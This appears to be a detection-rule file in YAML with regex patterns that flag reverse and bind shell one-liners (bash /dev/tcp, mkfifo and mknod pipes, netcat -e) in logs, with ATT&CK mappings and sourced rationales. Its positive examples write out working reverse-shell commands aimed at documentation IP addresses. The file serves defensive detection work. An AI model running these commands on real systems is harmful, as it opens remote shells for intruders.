# Mention patterns for reverse and bind shell one-liners, in any language, as they appear in raw text: shell history
# shippers, web and application logs that echo a payload, exploit attempts captured by a WAF, or command text that
# no typed parser normalized. The shapes come from the public reverse-shell catalogs cited per entry (the
# revshells.com generator's command list and SigmaHQ rules); they are generalized with bounded gaps so one pattern
# covers the variants that differ only in host, port, shell or spacing.
#
# A match says the text was present. It does not prove the shell ran or connected; that takes typed process and
# network evidence.

- id: mention.revshell_dev_tcp_stdio
  title: 'bash /dev/tcp or /dev/udp path with a stdio redirection'
  match:
    anchored: '/dev/(?:tcp|udp)/[A-Za-z0-9.:_-]{1,253}/[0-9]{1,5} {0,3}(?:0>&1|0<&1|<&1|>&0)'
  case_sensitive: true
  strength: strong
  attack: [T1059.004, T1095]
  telemetry: [any]
  source:
    name: Reverse Shell Generator (revshells.com) command catalog
    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
    license: MIT
    upstream_id: null
  rationale: >-
    Redirecting a socket opened through bash's /dev/tcp onto standard input or output ('0>&1', '<&1') is the core of
    every bash reverse shell variant. Health checks and wait-for-port scripts open /dev/tcp only to test a port and
    redirect errors ('2>&1' or '2>/dev/null'), which this pattern does not accept.
  examples:
    positive:
      - 'Nov 20 10:01:02 web01 bash[4242]: HISTORY: bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'
      - 'Nov 20 10:01:03 web01 php-fpm[880]: system(): sh -i >& /dev/udp/203.0.113.7/53 0>&1'
      - 'Nov 20 10:01:04 sun02 sh[626]: sh >/dev/tcp/198.51.100.3/53 <&1 2>&1'
    negative:
      - 'Nov 20 10:01:05 web01 healthcheck: bash -c "echo > /dev/tcp/127.0.0.1/5432 2>&1" && echo db up'
      - 'Nov 20 10:01:06 web01 entrypoint.sh: timeout 1 bash -c "</dev/tcp/db/5432" 2>/dev/null || sleep 1'

- id: mention.revshell_dev_tcp_any
  title: bash /dev/tcp or /dev/udp socket path with a host and port
  match:
    anchored: '/dev/(?:tcp|udp)/[A-Za-z0-9.:_-]{1,253}/[0-9]{1,5}'
  case_sensitive: true
  strength: weak
  attack: [T1059.004, T1095, T1046]
  telemetry: [any]
  source:
    name: Reverse Shell Generator (revshells.com) command catalog
    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
    license: MIT
    upstream_id: null
  rationale: >-
    Any bash /dev/tcp socket path. Reverse shells, port scans and tool-less downloads use it, and so do container
    health checks and wait-for scripts, so it is a weak candidate; the stdio entry above is the strong form.
  examples:
    positive:
      - 'Nov 20 10:02:00 web01 bash[5013]: HISTORY: cat </dev/tcp/203.0.113.7/8000 > /tmp/.x'
    negative:
      - 'Nov 20 10:02:01 web01 bash[5014]: HISTORY: ls -l /dev/tty1'
      - 'Nov 20 10:02:02 web01 kernel: [ 12.0] tcp: last ACK of /dev/null ignored'

- id: mention.revshell_fifo_shell_to_client
  title: 'mkfifo line with a shell and a pipe into a network client'
  match:
    anchored: 'mkfifo [^\n]{0,120}(?:/|\b)(?:ba|da|z|k|a)?sh(?: -i)?\b[^\n|]{0,60}\| {0,2}(?:nc|ncat|netcat|telnet|openssl)\b'
  case_sensitive: false
  strength: strong
  attack: [T1059.004, T1095]
  telemetry: [any]
  source:
    name: Reverse Shell Generator (revshells.com) command catalog
    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
    license: MIT
    upstream_id: null
  rationale: >-
    The 'mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc host port > /tmp/f' family (also with ncat -u, telnet and
    openssl s_client) loops a shell through a FIFO and a network client; it is the standard reverse shell where
    netcat lacks -e. Database dump pipelines also use mkfifo but never pipe a shell into a network client.
  examples:
    positive:
      - 'Nov 20 10:03:00 web01 bash[5100]: HISTORY: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.7 4444 >/tmp/f'
      - 'Nov 20 10:03:01 web01 bash[5101]: HISTORY: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 203.0.113.7:443 > /tmp/s; rm /tmp/s'
    negative:
      - 'Nov 20 10:03:02 db01 bash[5102]: HISTORY: mkfifo /tmp/pgpipe; pg_dump app | gzip > /tmp/pgpipe &'
      - 'Nov 20 10:03:03 db01 bash[5103]: HISTORY: mkfifo /tmp/f; ssh backup01 "cat > /srv/dump" < /tmp/f'

- id: mention.revshell_fifo_client_to_shell
  title: 'mkfifo line with a network client and a pipe into a shell'
  match:
    anchored: 'mkfifo [^\n]{0,120}(?:telnet|nc|ncat|openssl s_client) [^\n|]{0,120}\| {0,2}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
  case_sensitive: false
  strength: strong
  attack: [T1059.004, T1095]
  telemetry: [any]
  source:
    name: Reverse Shell Generator (revshells.com) command catalog
    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
    license: MIT
    upstream_id: null
  rationale: >-
    The reverse ordering of the FIFO shell, 'mkfifo $TF && telnet host port 0<$TF | sh 1>$TF': a network client's
    output is piped into a shell. No administrative pipeline feeds remote bytes to a shell through a FIFO.
  examples:
    positive:
      - 'Nov 20 10:04:00 web01 bash[5104]: HISTORY: TF=$(mktemp -u);mkfifo $TF && telnet 203.0.113.7 23 0<$TF | sh 1>$TF'
    negative:
      - 'Nov 20 10:04:01 web01 bash[5105]: HISTORY: mkfifo /tmp/q && nc -l 9000 > /tmp/q &'
      - 'Nov 20 10:04:02 web01 bash[5106]: HISTORY: mkfifo /var/run/app.fifo; chmod 600 /var/run/app.fifo'

- id: mention.revshell_mknod_backpipe
  title: 'mknod ... p line with netcat or telnet'
  match:
    anchored: 'mknod [^\n]{1,80} p {0,2}(?:&&|;)[^\n]{0,120}\b(?:nc|ncat|telnet)\b'
  case_sensitive: false
  strength: strong
  attack: [T1059.004, T1095]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Suspicious Reverse Shell Command Line (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
    license: DRL-1.1
    upstream_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
  rationale: >-
    Generalizes the rule's 'mknod /tmp/backpipe p && nc' and 'mknod /tmp/p p &&' keywords to any pipe name: on old
    systems without mkfifo, a mknod FIFO chained to netcat or telnet is the reverse-shell loop. Device creation with
    mknod uses c or b, not p, and is not followed by a network client.
  examples:
    positive:
      - 'Nov 20 10:05:00 web01 bash[5107]: HISTORY: mknod /tmp/bp p && nc 203.0.113.7 80 0</tmp/bp | /bin/bash 1>/tmp/bp'
    negative:
      - 'Nov 20 10:05:01 web01 bash[5108]: HISTORY: mknod /dev/loop8 b 7 8'
      - 'Nov 20 10:05:02 web01 bash[5109]: HISTORY: mknod /tmp/ctl p; chmod 600 /tmp/ctl'

- id: mention.revshell_netcat_exec_first_flag
  title: 'nc -e or -c with a shell argument, in the first option group'
  match:
    anchored: '\bnc -[a-zA-Z]{0,6}[ec] {0,2}(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|c|tc|a)?sh\b|cmd(?:\.exe)?\b|powershell(?:\.exe)?\b)'
  case_sensitive: true
  strength: strong
  attack: [T1059.004, T1095]
  telemetry: [any]
  source:
    name: Reverse Shell Generator (revshells.com) command catalog
    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
    license: MIT
    upstream_id: null
  rationale: >-
    netcat's -e (execute) or -c (run through sh) with a shell as the program is a bind or reverse shell; grouped flags
    such as '-lvnpe /bin/sh' are covered. Case-sensitive so OpenBSD netcat's -C (send CRLF) is not read as -c.
    rsync's '-e ssh' does not match because the program must be a shell.
  examples:
    positive:
      - 'Nov 20 10:06:00 web01 bash[5110]: HISTORY: nc -e /bin/sh 203.0.113.7 4444'
      - 'Nov 20 10:06:01 web01 bash[5111]: HISTORY: nc -lvnpe /bin/bash 4444'
      - 'Nov 20 10:06:02 web01 bash[5112]: HISTORY: nc -c bash 203.0.113.7 4444'
    negative:
      - 'Nov 20 10:06:03 web01 bash[5113]: HISTORY: rsync -avz -e ssh /srv/ backup01:/srv/'
      - 'Nov 20 10:06:04 web01 bash[5114]: HISTORY: nc -zv db01 5432'

- id: mention.revshell_netcat_exec_later_flag
  title: 'nc -e or -c with a shell argument, after the host or port'
  match:
    anchored: ' nc [^|;&\n]{1,80} -[a-zA-Z]{0,5}[ec] {0,2}(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|c|tc|a)?sh\b|cmd(?:\.exe)?\b|powershell(?:\.exe)?\b)'
  case_sensitive: true
  strength: strong
  attack: [T1059.004, T1095]
  telemetry: [any]
  source:
    name: Reverse Shell Generator (revshells.com) command catalog
    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
    license: MIT
    upstream_id: null
  rationale: >-
    The 'nc host port -e shell' and 'busybox nc host port -e sh' orderings, when nc follows other text on the line.
    Same meaning as the first-flag entry; a separate entry covers a line that starts with nc.
  examples:
    positive:
      - 'Nov 20 10:07:00 cam01 sh[300]: busybox nc 203.0.113.7 4444 -e sh'
      - 'Nov 20 10:07:01 web01 bash[5115]: HISTORY: cd /tmp; nc 203.0.113.7 4444 -e /bin/bash'
    negative:
      - 'Nov 20 10:07:02 web01 bash[5116]: HISTORY: echo stats | nc -q1 graphite 2003'
      - 'Nov 20 10:07:03 web01 bash[5117]: HISTORY: tar cf - /srv | nc 10.0.0.9 9000 -q 1'

